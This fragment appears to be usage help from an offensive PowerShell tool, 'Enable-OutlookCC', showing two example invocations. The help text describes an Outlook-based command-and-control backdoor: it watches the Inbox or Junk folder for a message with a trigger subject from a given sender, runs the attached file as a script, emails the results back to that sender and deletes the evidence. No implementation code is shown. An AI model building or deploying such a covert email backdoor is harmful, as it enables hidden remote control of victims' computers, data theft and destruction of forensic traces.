...
.EXAMPLE
   Enable-OutlookCC -Folder Inbox -From jdoe@hotmail.com -Trigger "Quick Question"

   This will monitor the users Inbox for a message from 'jdoe@hotmail.com' with a subject of 'Quick Question'.  Once detected, the script will run the attached .txt file, and return the results to the senders email, and clean up the evidence.
.EXAMPLE
   Enable-OutlookCC -Folder Junk -From jdoe@hotmail.com -Trigger "Quick Question"
